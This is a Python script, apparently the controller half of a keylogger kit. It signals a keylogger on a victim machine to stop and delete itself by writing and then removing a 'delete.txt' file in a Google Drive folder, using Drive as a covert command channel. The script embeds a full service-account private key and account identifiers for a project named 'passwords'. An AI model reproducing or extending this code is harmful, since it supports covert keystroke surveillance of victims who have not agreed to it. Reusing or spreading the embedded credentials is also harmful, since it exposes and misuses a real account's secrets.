import json
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import io
from googleapiclient.http import MediaIoBaseUpload
from google.oauth2 import service_account
#make sure that the keylogger is running!
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import time

'''THIS SCRIPT STOPS THE KEYLOGGER FROM RUNNING AND DELETES IT
THE KEYLOGGER MUST BE RUNNING WHEN YOU RUN THIS SCRIPT'''

SCOPES = ['https://www.googleapis.com/auth/drive.file']
EMBEDDED_CREDENTIALS = r'''{
  "type": "service_account",
  "project_id": "passwords-391710",
  "private_key_id": "900a1a961dd38547dee9a709a83727d37ccb8799",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDYsaOJ5D6Yc6Zs\nC9qOyuxfN2CSm3tSZfTTm7u06YSCcHxIHbyx+8zolVc9qlgoKdNgZRcz2qyLJ558\n+0CHn1WVOFTFWlLDIp1fezQvvQwyrp4nbOPo2Fqjky/Djkslo4D9oPMHj3LcbdP8\nxMFmBQXwzo9eMd8lAJ14xDll+JPkm7OFuV1EGEswzGbbizsPCk+FRq1oq19N8GpH\nOvVtbfd+GS9+Y3fXzjzxYInj/w673PopRBSuzoXXlM8cvaRO1cwQlvtb0zPpk5u0\n3y3aEhw4wf83WHwbYNMZ7bHmiiCLI7So8BZuBCIoTXRZ7TiWzj/89xFuDn6Qz7dm\nOQADNbe5AgMBAAECggEADIUS8FQeI7vG2UZEDez+hC/UZhQSp3uZjiJY0YaOb+Tk\n4VvKe7QTLjr2q+rsJgHooxCkKwxO3MlguFLh8xQLI1B6YV6rGnglBI+/P6TaEBGT\ntK5vapQZhIrr/w35HIcaXE0QzZaFqeO0lE2f6O+QXM3qbaRPArnK31/i+xfGH7ae\nCel8vwYpLEfBPKNQWmBtS/BZfHpgx1uAw10KacGWXbn9klPInIWIC+xCZgKzTSR0\niq+4U7arEX2IRUBNu4tGR42m+4Kd6//xXEvxg2ak0zOkQ3oRAF+GcVGZUpEGXLVl\n9i6nCELKWdaLi439Do5bC/0d2JXgxRbj7rMQQs1cSQKBgQDyZdYRglrfzaNwXTbz\nJM6uw8hpiw4EcSblMeJ7xc8oybdvEfnU9ACFNM81unsNR6Q36NyFzAMCfTyP6eoj\nuQ+2TwiYbc+zEZy8f36st4sMEzHLu7ecih0qiGQfpH1S/mpSTxHy+0xtcC+nPBee\nmYBbj/K2Kb8rf6qF8472RWB/7QKBgQDk2o2xVoTZ/78WLOQnE/8BT1wpX/B/BGME\nXZlCZgGTSgsOqLIMm+0MuUSa5XX9Vyqdu70drgbaue+9eOXB+Q540HfwHozJg9Wm\n1y15CEjqXSxyayS2KUfLiF+k+XLc6jWR1zTU/oKoz7gGPTPXI3ECDIdKsGagG/Or\nGoC7W8IlfQKBgD1rbGiXXStkUcuA8xF8/BnwZfHIWE7r1O0yTK8MGke9hQtRxLoe\n8ZrPHMoCbHea9ZNtH6OPZBvXW+cjYD6Y/9A0CnuFJ6G6Drr8mz5sa4Etw+pZsFar\n8GP8l1IlPdQvvwUIIAYvgtggGxMG+P0o7AtHWDqsLVJ6UN0ML+dbAO6pAoGBAKm1\nyU2xM2PWXAY91BOGqJx4FYg5NUd8IVGjd3vd2V04k2qTfzYKi4fb/BxB/XWZpmjC\nSEQyQbMCH98KQJfP8gN11PukLBNkSJQpDferRSdHYSaYfej4Q92TjBnzQlLA/Gji\nhrNM6ef14in+SOtJxQwX7lxc5D3nfJNuW/iU2yyhAoGBALNnQCWPQkj4sy9uxu1V\nl3yH/SJ7QLnG3yfH8V8oOTG0yPHFcWUONNhvFfvDvByZPFKfFr8oUl6xUpPMBQ/t\nn+x1w9rDtmHlbZxHmOz/kZIfAya65czAkxKHpID26EBO+vvFa0tz+meSc1Aumq37\nvq35yXsg7+mS+kFHrdqaCxkB\n-----END PRIVATE KEY-----\n",
  "client_email": "passwords@passwords-391710.iam.gserviceaccount.com",
  "client_id": "115201121354988820459",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/passwords%40passwords-391710.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}'''


def create_file_in_folder(service, folder_id):
	file_metadata = {
		'name': 'delete.txt',
		'parents': [folder_id]
	}
	media = MediaIoBaseUpload(io.BytesIO(b'Hello, World!'), mimetype='text/plain')
	file = service.files().create(body=file_metadata, media_body=media).execute()
	print(f"Created file with ID {file.get('id')}")
	
def authenticate():
	# Load the embedded credentials
	credentials_json = json.loads(EMBEDDED_CREDENTIALS)
	
	# Create credentials from the Service Account JSON
	credentials = service_account.Credentials.from_service_account_info(credentials_json, scopes=SCOPES)
	
	# Build the service object
	service = build('drive', 'v3', credentials=credentials)
	
	return service

def create_file(service, filepath, filename):
	file_metadata = {'name': filename}
	media = MediaFileUpload(filepath, resumable=True)
	
	file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
	print('File ID: %s' % file.get('id'))


def delete_files_named_delete_txt(credentials_dict, filename_to_delete="delete.txt"):
	# Load the embedded service account credentials
	creds = Credentials.from_service_account_info(credentials_dict, scopes=["https://www.googleapis.com/auth/drive"])

	# Build the Drive API client
	drive_service = build('drive', 'v3', credentials=creds)

	# Query files with the given name
	results = drive_service.files().list(q=f"name='{filename_to_delete}'", spaces='drive').execute()
	items = results.get('files', [])

	for item in items:
		try:
			drive_service.files().delete(fileId=item['id']).execute()
			print(f"Deleted file with ID: {item['id']}")
		except HttpError as error:
			print(f"An error occurred: {error}")

	return len(items)

EMBEDDED_CREDENTIALS_JSON = json.loads(EMBEDDED_CREDENTIALS)

def main():
	#create delete.txt file to signal the keylogger on other end to stop
	service = authenticate()
	FOLDER_ID = '1iivgLL9y-EBr-gVuY6Hvwhbs8JxB3K-_'
	create_file_in_folder(service, FOLDER_ID)

	time.sleep(130) #making sure that the keylogger on the other end sees it.
	
	#deleting the delete.txt file from the service account because the only way is through the api.
	deleted_count = delete_files_named_delete_txt(EMBEDDED_CREDENTIALS_JSON)
	print(f"Deleted {deleted_count} files named 'delete.txt'.")
	

if __name__ == '__main__':
	main()
